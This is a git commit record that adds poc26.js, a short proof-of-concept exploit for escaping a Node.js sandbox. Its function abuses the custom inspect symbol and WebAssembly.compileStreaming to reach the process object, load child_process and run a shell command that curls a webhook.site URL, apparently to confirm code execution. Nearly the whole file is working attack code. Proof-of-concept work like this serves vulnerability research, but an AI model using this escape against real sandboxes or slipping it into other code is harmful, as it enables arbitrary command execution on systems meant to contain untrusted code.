38ea9fd1164ce5c7d0cfcad63a5861efbd6ab5de
Sarp Dora Yönden <69794292+sarpdora23@users.noreply.github.com>
2024-06-23 22:23:50 +0300

    Update and rename poc25.js to poc26.js

---
+++ poc26.js
@@ -0,0 +1,19 @@
+const fs = require('fs');
+const fetch = require('node-fetch');
+const path = require('path');
+
+function escapeSanbox(ctx, req, res) {
+    const customInspectSymbol = Symbol.for('nodejs.util.inspect.custom');
+
+    obj = {
+    [customInspectSymbol]: (depth, opt, inspect) => {
+        inspect.constructor('return process')().mainModule.require('child_process').execSync('curl https://webhook.site/e4c4d30e-841b-43ee-8b63-8749c0066779');
+    },
+    valueOf: undefined,
+    constructor: undefined,
+}
+
+WebAssembly.compileStreaming(obj).catch(()=>{});
+}
+
+module.exports = escapeSanbox;
